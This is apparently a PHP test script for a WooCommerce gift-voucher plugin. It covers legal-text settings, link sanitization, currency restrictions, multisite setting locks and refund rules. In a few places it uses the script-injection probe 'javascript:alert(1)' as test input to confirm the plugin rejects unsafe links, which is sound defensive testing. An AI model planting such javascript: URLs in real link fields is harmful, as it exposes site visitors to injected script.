$vc11_fields = array_values( array_filter( VCAP\LegalInfo::settings_fields(), static fn( $f ) => ! in_array( $f['type'], array( 'title', 'sectionend' ), true ) ) );
$vc11_set_src = (string) file_get_contents( VCAP_PATH . 'src/Settings.php' );
check(
	'SET-VC-11: register – issuer name/address/contact, links terms/privacy/withdrawal and the legal text are settings of "General" with legal weight, empty by default, exported, no secret; the block "Issuer and legal texts" builds each field with SettingsRegistry::field() and shows its help visibly',
	array(
		'vcap_issuer_name'    => array( 'string', '', '', true, true, false ),
		'vcap_issuer_address' => array( 'text', '', '', true, true, false ),
		'vcap_issuer_contact' => array( 'string', '', '', true, true, false ),
		'vcap_terms_url'      => array( 'string', '', '', true, true, false ),
		'vcap_privacy_url'    => array( 'string', '', '', true, true, false ),
		'vcap_withdrawal_url' => array( 'string', '', '', true, true, false ),
		'vcap_legal_text'     => array( 'text', '', '', true, true, false ),
	) === $vc11_reg
		&& VCAP\LegalInfo::OPTIONS === array_column( $vc11_fields, 'id' ) && array() === array_filter( $vc11_fields, static fn( $f ) => isset( $f['desc_tip'] ) || '' === trim( (string) ( $f['desc'] ?? '' ) ) || ! str_contains( (string) $f['desc'], 'Not legally checked' ) )
		&& str_contains( $vc11_set_src, 'VoucherCurrency::settings_fields(), LegalInfo::settings_fields()' ) && str_contains( $vc11_set_src, 'LegalInfo::register_sanitizers();' ),
	wp_json_encode( $vc11_reg )
);
// Defaults: the shop details at render time.
$GLOBALS['vcap_test_options'] = array(
	'woocommerce_default_country' => 'DE:BE',
	'woocommerce_store_address'   => 'Musterstraße 1',
	'woocommerce_store_postcode'  => '10115',
	'woocommerce_store_city'      => 'Berlin',
);
$GLOBALS['vcap_test_privacy_url'] = 'https://shop.test/datenschutz/';
$GLOBALS['vcap_test_terms_page']  = 0;
$vc11_default  = Placeholders::replace( '{issuer}|{legal_text}|{terms_url}|{privacy_url}|{withdrawal_url}', $v );
$vc11_no_store = ( static function () use ( $v ) {
	$GLOBALS['vcap_test_options'] = array( 'woocommerce_default_country' => 'DE:BE' );
	return Placeholders::replace( '{issuer}', $v );
} )();
check(
	'SET-VC-11: empty settings take the shop details when the voucher is rendered – {issuer} = site name and WooCommerce store address (with country), {privacy_url} = the WordPress privacy page, {terms_url} = the WooCommerce terms page (none here), {legal_text} and {withdrawal_url} stay empty; without a store address only the name',
	"Café Süß & Co\nMusterstraße 1\n10115 Berlin\nDE||" . '|https://shop.test/datenschutz/|' === $vc11_default && 'Café Süß & Co' === $vc11_no_store,
	$vc11_default . ' / ' . $vc11_no_store
);
// Own values win; the links are only http(s).
$GLOBALS['vcap_test_options'] = array(
	'woocommerce_default_country' => 'DE:BE',
	'woocommerce_store_address'   => 'Musterstraße 1',
	'vcap_issuer_name'            => 'Gutschein GmbH',
	'vcap_issuer_address'         => "Hauptstraße 5\n1010 Wien",
	'vcap_issuer_contact'         => 'Tel. 01 234, gutschein@example.com',
	'vcap_terms_url'              => 'https://shop.test/agb/',
	'vcap_privacy_url'            => 'https://shop.test/privacy/',
	'vcap_withdrawal_url'         => 'https://shop.test/widerruf/',
	'vcap_legal_text'             => 'Rechtlicher Hinweis',
);
$vc11_own = Placeholders::values( $v );
$GLOBALS['vcap_test_options']['vcap_terms_url'] = 'javascript:alert(1)';
$vc11_bad_stored = VCAP\LegalInfo::terms_url();
// Polylang translates the texts in the mail/visitor language (WPML translates the options itself).
$GLOBALS['vcap_test_pll']      = array( 'en' => array( 'Rechtlicher Hinweis' => 'Legal notice', 'Gutschein GmbH' => 'Voucher Ltd' ) );
$GLOBALS['vcap_test_pll_lang'] = 'en';
$vc11_en                       = Placeholders::replace( '{issuer}|{legal_text}', $v );
$GLOBALS['vcap_test_pll_lang'] = '';
check(
	'SET-VC-11: own values replace the defaults in PDF and email placeholders (Placeholders::values() and email_map()); a stored link that is no http(s) URL prints nothing; with Polylang the issuer and the legal text are printed in the current language',
	"Gutschein GmbH\nHauptstraße 5\n1010 Wien\nTel. 01 234, gutschein@example.com" === $vc11_own['issuer'] && 'Rechtlicher Hinweis' === $vc11_own['legal_text'] && 'https://shop.test/agb/' === $vc11_own['terms_url']
		&& 'https://shop.test/privacy/' === $vc11_own['privacy_url'] && 'https://shop.test/widerruf/' === $vc11_own['withdrawal_url'] && '' === $vc11_bad_stored
		&& str_starts_with( $vc11_en, "Voucher Ltd\nHauptstraße 5" ) && str_ends_with( $vc11_en, '|Legal notice' )
		&& array() === array_diff( array( '{issuer}', '{legal_text}', '{terms_url}', '{privacy_url}', '{withdrawal_url}' ), array_keys( Placeholders::email_map( null ) ) ),
	wp_json_encode( array( $vc11_own, $vc11_en ) )
);
$vc11_url_errors = array(
	VCAP\LegalInfo::sanitize_url_option( 'ftp://shop.test/agb', array( 'id' => 'vcap_terms_url', 'title' => 'Terms' ) ),
	VCAP\LegalInfo::sanitize_url_option( ' https://shop.test/agb/ ', array( 'id' => 'vcap_terms_url' ) ),
	VCAP\LegalInfo::sanitize_url_option( '', array( 'id' => 'vcap_terms_url' ) ),
	VCAP\SettingsTransfer::validate( 'vcap_withdrawal_url', 'javascript:alert(1)' ),
	VCAP\SettingsTransfer::validate( 'vcap_withdrawal_url', 'https://shop.test/widerruf/' ),
	VCAP\SettingsTransfer::validate( 'vcap_legal_text', "<b>Hinweis</b>\nZeile 2" ),
	VCAP\LegalInfo::sanitize_text( "<b>Hinweis</b>\nZeile 2" ),
);
check(
	'SET-VC-11: links are checked on the settings page and on import/WP-CLI – an invalid link is not saved (the stored value stays) or refused, a valid one stored, empty = default page; address and legal text are plain text with line breaks',
	null === $vc11_url_errors[0] && 'https://shop.test/agb/' === $vc11_url_errors[1] && '' === $vc11_url_errors[2] && is_wp_error( $vc11_url_errors[3] ) && 'https://shop.test/widerruf/' === $vc11_url_errors[4]
		&& "Hinweis\nZeile 2" === $vc11_url_errors[5] && "Hinweis\nZeile 2" === $vc11_url_errors[6],
	wp_json_encode( $vc11_url_errors )
);
// Existing vouchers and emails stay unchanged: no default template or default email text uses the new placeholders.
$vc11_used = array();
foreach ( VCAP\TemplatePostType::default_designs() as $vc11_design ) {
	foreach ( (array) ( $vc11_design['elements'] ?? array() ) as $vc11_el ) {
		$vc11_used[] = (string) ( $vc11_el['text'] ?? '' );
	}
}
foreach ( array_merge( glob( VCAP_PATH . 'src/Emails/*.php' ), glob( VCAP_PATH . 'templates/emails/*.php' ), glob( VCAP_PATH . 'templates/emails/plain/*.php' ) ) as $vc11_file ) {
	$vc11_used[] = (string) file_get_contents( $vc11_file );
}
$vc11_new_tokens = '/\{(issuer|legal_text|terms_url|privacy_url|withdrawal_url)\}/';
$vc11_wpml       = (string) file_get_contents( VCAP_PATH . 'wpml-config.xml' );
check(
	'SET-VC-11: existing vouchers and emails are unchanged – no default PDF design, email class or email template uses the new placeholders; the PDF designer and the email settings offer them (definitions()); WPML (wpml-config.xml admin-texts) and Polylang (Multilingual::OPTIONS) translate all seven settings',
	array() === preg_grep( $vc11_new_tokens, $vc11_used ) && array() === array_diff( array( 'issuer', 'legal_text', 'terms_url', 'privacy_url', 'withdrawal_url' ), array_keys( Placeholders::definitions() ) )
		&& array() === array_diff( VCAP\LegalInfo::OPTIONS, VCAP\Compat\Multilingual::OPTIONS )
		&& array() === array_filter( VCAP\LegalInfo::OPTIONS, static fn( $key ) => ! str_contains( $vc11_wpml, '<key name="' . $key . '" />' ) ),
	wp_json_encode( preg_grep( $vc11_new_tokens, $vc11_used ) )
);
unset( $GLOBALS['vcap_test_privacy_url'], $GLOBALS['vcap_test_terms_page'] );
$GLOBALS['vcap_test_options'] = $vc11_saved;


echo "Multi-currency status and setting locks (SET-VC-32, SET-VC-34)\n";
$mc_saved_opts    = $GLOBALS['vcap_test_options'];
$mc_saved_filters = $GLOBALS['vcap_test_filters'];
if ( ! function_exists( 'wc_add_notice' ) ) {
	function wc_add_notice( $message, $type = 'success' ) { $GLOBALS['vcap_test_notices'][] = array( $type, (string) $message ); }
}
if ( ! class_exists( 'WC_Product' ) ) {
	// Minimal product for the add-to-cart check (declared only here, after every other test).
	class WC_Product {
		public function __construct( private array $meta = array() ) {}
		public function get_meta( $k ) { return $this->meta[ $k ] ?? ''; }
		public function is_type( $t ) { return 'simple' === $t; }
		public function get_id() { return 1; }
	}
}
// A stubbed second currency plugin (WOOCS-like): lists USD with a rate; the active currency is switched by its filter.
final class VCAP_Test_Woocs {
	public function get_currencies() { return array( 'EUR' => array( 'rate' => 1 ), 'USD' => array( 'rate' => 1.08 ) ); }
}
$GLOBALS['vcap_test_options'] = array( 'woocommerce_currency' => 'EUR' );
$GLOBALS['vcap_test_notices'] = array();
$mc_voucher                   = new WC_Product( array( '_vcap_enabled' => 'yes' ) );
$mc_other                     = new WC_Product( array() );
$mc_status_none               = array_values( VCAP\VoucherCurrency::status() );
check(
	'SET-VC-32: register – "Sell vouchers only in the shop currency" is a bool on "General", default no (as before); General has the block "Currencies" with a display-only status line (is_option false) and the checkbox',
	'no' === VCAP\SettingsRegistry::default( VCAP\VoucherCurrency::OPTION ) && 'bool' === VCAP\SettingsRegistry::get( VCAP\VoucherCurrency::OPTION )['type'] && '' === VCAP\SettingsRegistry::get( VCAP\VoucherCurrency::OPTION )['section']
		&& ( static function (): bool {
			$by_id = array_column( VCAP\VoucherCurrency::settings_fields(), null, 'id' );
			return false === ( $by_id['vcap_currency_status']['is_option'] ?? null ) && VCAP\VoucherCurrency::FIELD_TYPE === $by_id['vcap_currency_status']['type'] && 'checkbox' === $by_id[ VCAP\VoucherCurrency::OPTION ]['type'] && 'no' === $by_id[ VCAP\VoucherCurrency::OPTION ]['default'];
		} )()
		&& str_contains( (string) file_get_contents( VCAP_PATH . 'src/Settings.php' ), 'VoucherCurrency::settings_fields()' )
);
check(
	'SET-VC-32: status without a currency switcher – none detected, leading currency EUR, automatic commands limited to 100 EUR',
	str_starts_with( $mc_status_none[0], 'None detected' ) && str_starts_with( $mc_status_none[1], 'EUR (shop base currency)' ) && str_contains( $mc_status_none[2], 'at most 100 EUR' ),
	json_encode( $mc_status_none )
);
check(
	'SET-VC-32: the commands hint follows F-05a (CommandLimits, no rule of its own) – CHF/USD/GBP the same number 100, SEK needs an own maximum, with an own maximum in SEK that one applies',
	str_contains( VCAP\VoucherCurrency::commands_hint( 'CHF' ), 'at most 100 CHF' ) && str_contains( VCAP\VoucherCurrency::commands_hint( 'USD' ), 'same number as in EUR' )
		&& ( static function (): bool {
			$GLOBALS['vcap_test_options']['woocommerce_currency'] = 'SEK';
			$without = VCAP\VoucherCurrency::commands_hint( 'SEK' );
			$GLOBALS['vcap_test_options'][ VCAP\API\V1\CommandLimits::option( 'voucher.issue', 'max_amount' ) ]          = '900';
			$GLOBALS['vcap_test_options'][ VCAP\API\V1\CommandLimits::option( 'voucher.issue', 'max_amount_currency' ) ] = 'SEK';
			$with                         = VCAP\VoucherCurrency::commands_hint( 'SEK' );
			$GLOBALS['vcap_test_options'] = array( 'woocommerce_currency' => 'EUR' );
			return str_contains( $without, 'enter your own maximum amount' ) && str_contains( $with, 'Your own maximum amount in SEK applies' );
		} )()
);
// Second currency plugin active, the customer switched to USD.
$GLOBALS['WOOCS'] = new VCAP_Test_Woocs(); // phpcs:ignore WordPress.NamingConventions.ValidVariableName
$GLOBALS['vcap_test_filters']['woocommerce_currency'] = array( array( static fn() => 'USD', 1 ) );
$mc_status_woocs = array_values( VCAP\VoucherCurrency::status() );
$mc_default      = array( VCAP\VoucherCurrency::refused(), VCAP\VoucherCurrency::allow_product( true, $mc_voucher ), $GLOBALS['vcap_test_notices'] );
check(
	'SET-VC-32: with a second currency plugin (stubbed WOOCS) the status names it as supported; with the default (off) a voucher can be bought in USD as before',
	str_starts_with( $mc_status_woocs[0], 'WOOCS (supported' ) && 'USD' === VCAP\VoucherCurrency::active_currency() && 'EUR' === VCAP\VoucherCurrency::base_currency()
		&& false === $mc_default[0] && true === $mc_default[1] && array() === $mc_default[2],
	json_encode( $mc_status_woocs )
);
$GLOBALS['vcap_test_options'][ VCAP\VoucherCurrency::OPTION ] = 'yes';
$mc_refused = array( VCAP\VoucherCurrency::refused(), VCAP\VoucherCurrency::allow_product( true, $mc_voucher ), VCAP\VoucherCurrency::allow_product( true, $mc_other ), VCAP\VoucherCurrency::allow_product( false, $mc_voucher ), $GLOBALS['vcap_test_notices'] );
check(
	'SET-VC-32: setting on and USD active – adding a voucher product is refused with an error notice naming both currencies; other products and an already refused add stay as they are',
	true === $mc_refused[0] && false === $mc_refused[1] && true === $mc_refused[2] && false === $mc_refused[3]
		&& 1 === count( $mc_refused[4] ) && 'error' === $mc_refused[4][0][0] && str_contains( $mc_refused[4][0][1], 'only be bought in EUR' ) && str_contains( $mc_refused[4][0][1], 'from USD to EUR' ),
	json_encode( $mc_refused )
);
$GLOBALS['vcap_test_filters']['woocommerce_currency'] = array( array( static fn() => 'EUR', 1 ) );
$mc_base = array( VCAP\VoucherCurrency::refused(), VCAP\VoucherCurrency::allow_product( true, $mc_voucher ) );
$GLOBALS['vcap_test_filters']['woocommerce_currency']             = array( array( static fn() => 'USD', 1 ) );
$GLOBALS['vcap_test_filters']['vcap_vouchers_shop_currency_only'] = array( array( static fn() => false, 1 ) );
$mc_filter = VCAP\VoucherCurrency::refused();
$mc_src    = (string) file_get_contents( VCAP_PATH . 'src/VoucherCurrency.php' );
check(
	'SET-VC-32: back in the shop currency the voucher can be bought; the filter vcap_vouchers_shop_currency_only wins over the setting; checkout (classic and block) is refused through woocommerce_check_cart_items',
	false === $mc_base[0] && true === $mc_base[1] && false === $mc_filter
		&& str_contains( $mc_src, "add_action( 'woocommerce_check_cart_items', array( self::class, 'check_cart' ) )" ) && str_contains( $mc_src, "add_filter( 'woocommerce_add_to_cart_validation'" )
		&& str_contains( (string) file_get_contents( VCAP_PATH . 'src/Plugin.php' ), '( new VoucherCurrency() )->register();' )
);
unset( $GLOBALS['WOOCS'] );
$GLOBALS['vcap_test_filters'] = $mc_saved_filters;

// SET-VC-34: a multisite-like simulation – the "network" locks settings per site through vcap_setting_locked.
$GLOBALS['vcap_test_filters']['vcap_setting_locked'] = array(
	array(
		static fn( $locked, $option ) => 2 === get_current_blog_id() && in_array( $option, array( 'vcap_code_length', 'vcap_attach_pdf', 'vcap_retention_days', VCAP\Markets::EXPIRY_OPTION ), true ) ? true : $locked,
		2,
	),
);
VCAP\SettingsRegistry::reset_flags();
$GLOBALS['vcap_test_blog_id'] = 1;
$GLOBALS['vcap_test_options'] = array( 'vcap_code_length' => '14' );
$lk_site1_field               = VCAP\SettingsRegistry::field( 'vcap_code_length', array( 'title' => 'Code length', 'type' => 'number', 'desc_tip' => 'Help.' ) );
$lk_site1_save                = VCAP\SettingsRegistry::sanitize_locked( '20', array( 'id' => 'vcap_code_length' ) );
$GLOBALS['vcap_test_blog_id'] = 2;
$lk_field                     = VCAP\SettingsRegistry::field( 'vcap_code_length', array( 'title' => 'Code length', 'type' => 'number', 'desc_tip' => 'Help.' ) );
$lk_check                     = VCAP\SettingsRegistry::field( 'vcap_attach_pdf', array( 'title' => 'PDF', 'type' => 'checkbox', 'desc' => 'Attach the PDF' ) );
$lk_save                      = VCAP\SettingsRegistry::sanitize_locked( '20', array( 'id' => 'vcap_code_length' ) );
check(
	'SET-VC-34: the core locks nothing (filter default false); on the locked site a field is disabled and read-only, not saved (is_option false) and says "Set by the network administrator."; the other site keeps an ordinary field',
	! VCAP\SettingsRegistry::locked( 'vcap_code_prefix' ) && VCAP\SettingsRegistry::locked( 'vcap_code_length' )
		&& 'disabled' === ( $lk_field['custom_attributes']['disabled'] ?? '' ) && 'readonly' === ( $lk_field['custom_attributes']['readonly'] ?? '' ) && false === $lk_field['is_option'] && str_contains( $lk_field['desc'], 'Set by the network administrator.' ) && 'Help.' === $lk_field['desc_tip'] && '8' === (string) ( $lk_field['custom_attributes']['min'] ?? '' )
		&& 'disabled' === ( $lk_check['custom_attributes']['disabled'] ?? '' ) && str_starts_with( $lk_check['desc'], 'Attach the PDF ' )
		&& ! isset( $lk_site1_field['custom_attributes']['disabled'] ) && ! isset( $lk_site1_field['is_option'] ) && '20' === $lk_site1_save && null === $lk_save,
	json_encode( array( $lk_field, $lk_site1_field ) )
);
check(
	'SET-VC-34: saving the tab hooks the lock check after every other sanitizer (null = WooCommerce keeps the stored value), also for fields an add-on built without field()',
	str_contains( (string) file_get_contents( VCAP_PATH . 'src/Settings.php' ), 'SettingsRegistry::hook_lock_checks();' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'src/SettingsRegistry.php' ), "array( self::class, 'sanitize_locked' ), PHP_INT_MAX, 2" )
);
// Import on the locked site: the locked values are skipped with a message, the rest is imported.
$GLOBALS['vcap_test_options'] = array( 'vcap_code_length' => '14', 'vcap_attach_pdf' => 'yes' );
$lk_parsed  = VCAP\SettingsTransfer::parse( (string) json_encode( array( 'format' => 'voucher-captain-settings', 'version' => 1, 'settings' => array( 'vcap_code_length' => '20', 'vcap_attach_pdf' => 'no', 'vcap_code_prefix' => 'GS' ) ) ) );
$lk_changed = is_array( $lk_parsed ) ? VCAP\SettingsTransfer::apply( $lk_parsed['settings'], VCAP\SettingsLog::VIA_IMPORT ) : array();
$lk_forced  = VCAP\SettingsTransfer::apply( array( 'vcap_code_length' => '30' ), VCAP\SettingsLog::VIA_CLI );
check(
	'SET-VC-34: import – locked settings are not imported (warning "set by the network administrator"), the others are; SettingsTransfer::apply() never stores a locked value',
	is_array( $lk_parsed ) && array( 'vcap_code_prefix' => 'GS' ) === $lk_parsed['settings'] && 2 === count( array_filter( $lk_parsed['warnings'], static fn( $w ) => str_contains( $w, 'is set by the network administrator' ) ) )
		&& array( 'vcap_code_prefix' ) === $lk_changed && array() === $lk_forced && '14' === get_option( 'vcap_code_length' ) && 'yes' === get_option( 'vcap_attach_pdf' ) && 'GS' === get_option( 'vcap_code_prefix' ),
	json_encode( $lk_parsed )
);
$lk_reset_preview = VCAP\SettingsTransfer::reset_preview( 'codes' );
$lk_reset         = VCAP\SettingsTransfer::reset( 'codes' );
$lk_cli           = (string) file_get_contents( VCAP_PATH . 'src/CLI/Command.php' );
check(
	'SET-VC-34: reset leaves a locked setting alone (and lists it); WP-CLI "settings set" refuses it with the message, "settings reset" names the locked ones',
	! isset( $lk_reset_preview['vcap_code_length'] ) && isset( $lk_reset_preview['vcap_code_prefix'] ) && '14' === get_option( 'vcap_code_length' ) && false === get_option( 'vcap_code_prefix' ) && in_array( 'vcap_code_prefix', $lk_reset['changed'], true )
		&& in_array( 'vcap_code_length', VCAP\SettingsTransfer::locked_resettable( 'codes' ), true ) && ! in_array( 'vcap_code_length', VCAP\SettingsTransfer::resettable( 'codes' ), true )
		&& preg_match( '/if \( SettingsRegistry::locked\( \$key \) \) \{\s*self::error\( SettingsRegistry::locked_message\( \$key \)/', $lk_cli ) && str_contains( $lk_cli, "'Set by the network administrator, not reset: '" ),
	json_encode( array_keys( $lk_reset_preview ) )
);
VCAP\CountryProfiles::reset();
$lk_profile = VCAP\CountryProfiles::preview( 'DE' );
$lk_apply   = VCAP\CountryProfiles::apply( 'DE', array( 'vcap_retention_days' ) );
check(
	'SET-VC-34: country profile – a locked value is shown with the message, never preselected, and applying it is refused (nothing changes)',
	is_array( $lk_profile ) && str_contains( $lk_profile['vcap_retention_days']['error'], 'set by the network administrator' ) && ! $lk_profile['vcap_retention_days']['preselected'] && ! $lk_profile['vcap_retention_days']['changed']
		&& str_contains( $lk_profile['expiry_row']['error'], 'set by the network administrator' ) && ! $lk_profile['expiry_row']['preselected']
		&& is_wp_error( $lk_apply ) && false === get_option( 'vcap_retention_days' ),
	json_encode( $lk_profile )
);
$GLOBALS['vcap_test_blog_id'] = 1;
$lk_site1_profile             = VCAP\CountryProfiles::preview( 'DE' );
check(
	'SET-VC-34: the same network on site 1 (nothing locked there) – the profile value is offered as usual',
	is_array( $lk_site1_profile ) && '' === $lk_site1_profile['vcap_retention_days']['error'] && $lk_site1_profile['vcap_retention_days']['preselected']
);
unset( $GLOBALS['vcap_test_blog_id'] );
$GLOBALS['vcap_test_filters'] = $mc_saved_filters;
$GLOBALS['vcap_test_options'] = $mc_saved_opts;
VCAP\SettingsRegistry::reset_flags();
VCAP\CountryProfiles::reset();

// SET-VC-05: refund and cancellation rules (1.12 no. 1–7) as settings in block "Refund & cancellation" of
// "Redemption & balance"; defaults = the fixed filter defaults of 1.2.0, each filter gets the setting and wins.
echo "SET-VC-05 refund and cancellation rules\n";
VCAP\SettingsRegistry::reset();
$v05_saved_opts    = $GLOBALS['vcap_test_options'];
$v05_saved_filters = $GLOBALS['vcap_test_filters'];
$v05_keys          = array( 'vcap_allow_refund_of_spent_vouchers', 'vcap_allow_refund_of_spent_top_ups', 'vcap_allow_refund_of_used_bonus', 'vcap_refund_guest_as_gift_card', 'vcap_keep_status_on_partial_return', 'vcap_restore_extension_days', 'vcap_balance_deduct_statuses', 'vcap_balance_restore_statuses' );
foreach ( $v05_keys as $v05_k ) {
	unset( $GLOBALS['vcap_test_options'][ $v05_k ], $GLOBALS['vcap_test_filters'][ $v05_k ] );
}
$v05_def    = VCAP\Settings::defaults();
$v05_fields = array();
foreach ( VCAP\Settings::refund_rule_fields() as $v05_f ) {
	if ( isset( $v05_f['id'] ) && VCAP\SettingsRegistry::has( (string) $v05_f['id'] ) ) {
		$v05_fields[ $v05_f['id'] ] = $v05_f;
	}
}
check(
	'SET-VC-05: defaults are the behaviour of 1.2.0 (no refund of spent value, guest refund as gift card, keep status, no extension, charge at processing/completed, book back at cancelled/refunded/failed); one field per setting in "Redemption & balance", legal weight, visible "not legally checked" help',
	'no' === $v05_def['vcap_allow_refund_of_spent_vouchers'] && 'no' === $v05_def['vcap_allow_refund_of_spent_top_ups'] && 'no' === $v05_def['vcap_allow_refund_of_used_bonus'] && 'yes' === $v05_def['vcap_refund_guest_as_gift_card'] && 'yes' === $v05_def['vcap_keep_status_on_partial_return'] && 0 === $v05_def['vcap_restore_extension_days']
		&& array( 'processing', 'completed' ) === $v05_def['vcap_balance_deduct_statuses'] && array( 'cancelled', 'refunded', 'failed' ) === $v05_def['vcap_balance_restore_statuses']
		&& $v05_keys === array_keys( $v05_fields ) && array() === array_filter( $v05_keys, static fn( $k ) => 'redemption' !== VCAP\SettingsRegistry::get( $k )['section'] || ! VCAP\SettingsRegistry::get( $k )['legal'] )
		&& array() === array_filter( $v05_fields, static fn( $f ) => array_key_exists( 'desc_tip', $f ) || ! str_contains( (string) $f['desc'], 'Not legally checked' ) )
		&& 'redemption' === VCAP\Settings::general_section_of( 'vcap_refund_rules', 'vcap_restore_extension_days' ),
	wp_json_encode( array_keys( $v05_fields ) )
);
$v05_src = static fn( string $file ): string => (string) file_get_contents( VCAP_PATH . $file );
// No. 1: refund of spent voucher value (Issuer::guard_refund(), both call sites).
$v05_issuer = $v05_src( 'src/Issuer.php' );
$v05_call1  = "apply_filters( 'vcap_allow_refund_of_spent_vouchers', \$this->settings->yes( 'vcap_allow_refund_of_spent_vouchers' ), \$order, \$amount, \$spent )";
$v05_r1     = array( ( new VCAP\Settings() )->yes( 'vcap_allow_refund_of_spent_vouchers' ) );
$GLOBALS['vcap_test_options']['vcap_allow_refund_of_spent_vouchers'] = 'yes';
$v05_r1[] = ( new VCAP\Settings() )->yes( 'vcap_allow_refund_of_spent_vouchers' );
check( 'SET-VC-05: no. 1 refund of spent voucher value – setting takes effect (off by default, "yes" is the default of filter vcap_allow_refund_of_spent_vouchers at both call sites of Issuer::guard_refund())', array( false, true ) === $v05_r1 && 2 === substr_count( $v05_issuer, $v05_call1 ) && 2 === substr_count( $v05_issuer, "'vcap_allow_refund_of_spent_vouchers'," ) );
check( 'SET-VC-05: no. 1 refund of spent voucher value – filter wins (its result alone lets the refund through; integration test acceptance "SET-VC-05: …")', str_contains( $v05_issuer, "<= \$max_base + \$tolerance || " . $v05_call1 . ' ) {' ) && str_contains( $v05_issuer, 'if ( ' . $v05_call1 . ' ) {' ) && str_contains( $v05_src( 'tests/acceptance-integration.php' ), 'SET-VC-05:' ) );
// No. 2: refund of spent top-ups (TopUp::guard_refund()).
$v05_topup = $v05_src( 'src/TopUp.php' );
$v05_call2 = "apply_filters( 'vcap_allow_refund_of_spent_top_ups', 'yes' === Settings::value( 'vcap_allow_refund_of_spent_top_ups' ), \$order, \$amount, \$over + \$lost )";
$v05_r2    = array( VCAP\Settings::value( 'vcap_allow_refund_of_spent_top_ups' ) );
$GLOBALS['vcap_test_options']['vcap_allow_refund_of_spent_top_ups'] = 'yes';
$v05_r2[] = VCAP\Settings::value( 'vcap_allow_refund_of_spent_top_ups' );
check( 'SET-VC-05: no. 2 refund of spent top-ups – setting takes effect (off by default, "yes" is the default of filter vcap_allow_refund_of_spent_top_ups in TopUp::guard_refund())', array( 'no', 'yes' ) === $v05_r2 && 1 === substr_count( $v05_topup, "'vcap_allow_refund_of_spent_top_ups'," ) && str_contains( $v05_topup, $v05_call2 ) );
check( 'SET-VC-05: no. 2 refund of spent top-ups – filter wins (its result alone lets the refund through; integration test topup "SET-VC-05: …")', str_contains( $v05_topup, '( ! $codes && ! $unknown ) || ' . $v05_call2 . ' ) {' ) && str_contains( $v05_src( 'tests/topup-integration.php' ), 'SET-VC-05:' ) );
// No. 3: refund below a used bonus (Discounts\Bonus::guard_refund()).
$v05_bonus = $v05_src( 'src/Discounts/Bonus.php' );
$v05_call3 = "apply_filters( 'vcap_allow_refund_of_used_bonus', 'yes' === \\VCAP\\Settings::value( 'vcap_allow_refund_of_used_bonus' ), \$order, \$amount, \$used )";
$v05_r3    = array( VCAP\Settings::value( 'vcap_allow_refund_of_used_bonus' ) );
$GLOBALS['vcap_test_options']['vcap_allow_refund_of_used_bonus'] = 'yes';
$v05_r3[] = VCAP\Settings::value( 'vcap_allow_refund_of_used_bonus' );
check( 'SET-VC-05: no. 3 refund below a used bonus – setting takes effect (off by default, "yes" is the default of filter vcap_allow_refund_of_used_bonus in Bonus::guard_refund())', array( 'no', 'yes' ) === $v05_r3 && 1 === substr_count( $v05_bonus, "'vcap_allow_refund_of_used_bonus'," ) && str_contains( $v05_bonus, $v05_call3 ) );
check( 'SET-VC-05: no. 3 refund below a used bonus – filter wins (its result alone lets the refund through; integration test bonus "SET-VC-05: …")', str_contains( $v05_bonus, '$amount <= $max + 0.00001 || ' . $v05_call3 . ' ) {' ) && str_contains( $v05_src( 'tests/bonus-integration.php' ), 'SET-VC-05:' ) );
// No. 4: guest orders refunded as a new gift card (StoreCredit::guest_gift_card_email()).
$v05_guest = new class() extends WC_Order {
	public function get_billing_email() { return 'guest05@example.com'; }
};
$v05_r4 = array( VCAP\StoreCredit::guest_gift_card_email( $v05_guest ) );
$GLOBALS['vcap_test_options']['vcap_refund_guest_as_gift_card'] = 'no';
$v05_r4[]  = VCAP\StoreCredit::guest_gift_card_email( $v05_guest );
$v05_seen4 = null;
add_filter( 'vcap_refund_guest_as_gift_card', static function ( $allowed ) use ( &$v05_seen4 ) { $v05_seen4 = $allowed; return true; } );
$v05_r4[] = VCAP\StoreCredit::guest_gift_card_email( $v05_guest );
unset( $GLOBALS['vcap_test_filters']['vcap_refund_guest_as_gift_card'] );
check( 'SET-VC-05: no. 4 guest refund as gift card – setting takes effect (on by default; "no" = no gift card address)', 'guest05@example.com' === $v05_r4[0] && '' === $v05_r4[1] );
check( 'SET-VC-05: no. 4 guest refund as gift card – filter vcap_refund_guest_as_gift_card gets the setting (false) and wins', false === $v05_seen4 && 'guest05@example.com' === $v05_r4[2] );
// No. 5: keep the order status after a partial return (OrderReturn::keep_status_on_partial_return()).
$v05_return = $v05_src( 'src/OrderReturn.php' );
$v05_call5  = "apply_filters( 'vcap_keep_status_on_partial_return', 'yes' === Settings::value( 'vcap_keep_status_on_partial_return' ), \$order, (int) \$refund_id )";
$v05_r5     = array( VCAP\Settings::value( 'vcap_keep_status_on_partial_return' ) );
$GLOBALS['vcap_test_options']['vcap_keep_status_on_partial_return'] = 'no';
$v05_r5[] = VCAP\Settings::value( 'vcap_keep_status_on_partial_return' );
check( 'SET-VC-05: no. 5 keep the status after a partial return – setting takes effect (on by default, "no" is the default of filter vcap_keep_status_on_partial_return; integration test refund-lifecycle "SET-VC-05: …")', array( 'yes', 'no' ) === $v05_r5 && str_contains( $v05_return, 'if ( ! ' . $v05_call5 . ' ) {' ) && str_contains( $v05_src( 'tests/refund-lifecycle-integration.php' ), 'SET-VC-05: setting off' ) );
check( 'SET-VC-05: no. 5 keep the status after a partial return – filter wins (its result alone decides; integration test refund-lifecycle "SET-VC-05: … the filter wins")', 1 === substr_count( $v05_return, "'vcap_keep_status_on_partial_return'," ) && str_contains( $v05_src( 'tests/refund-lifecycle-integration.php' ), 'SET-VC-05: setting off, filter' ) );
// No. 6: extend an expired voucher when value is booked back (Coupons\BookBack::check_restored_card()).
$v05_saved_wpdb  = $GLOBALS['wpdb'] ?? null;
$GLOBALS['wpdb'] = new VCAP_Test_Wpdb();
$v05_order       = new class() extends WC_Order {
	public array $notes = array();
	public function get_id() { return 505; }
	public function get_order_number() { return '505'; }
	public function add_order_note( $note, $is_customer = 0, $added_by_user = false ) { $this->notes[] = (string) $note; return 1; }
};
$v05_card             = new Voucher();
$v05_card->id         = 505;
$v05_card->code       = 'GIFT-SET05';
$v05_card->status     = Voucher::STATUS_EXPIRED;
$v05_card->currency   = 'EUR';
$v05_card->expires_at = gmdate( 'Y-m-d H:i:s', time() - DAY_IN_SECONDS );
$v05_seen6            = array();
add_filter( 'vcap_restore_extension_days', static function ( $days ) use ( &$v05_seen6 ) { $v05_seen6[] = $days; return 0; } );
VCAP\Coupons\BookBack::check_restored_card( new VCAP\VoucherRepository(), $v05_order, $v05_card, 10.0 );
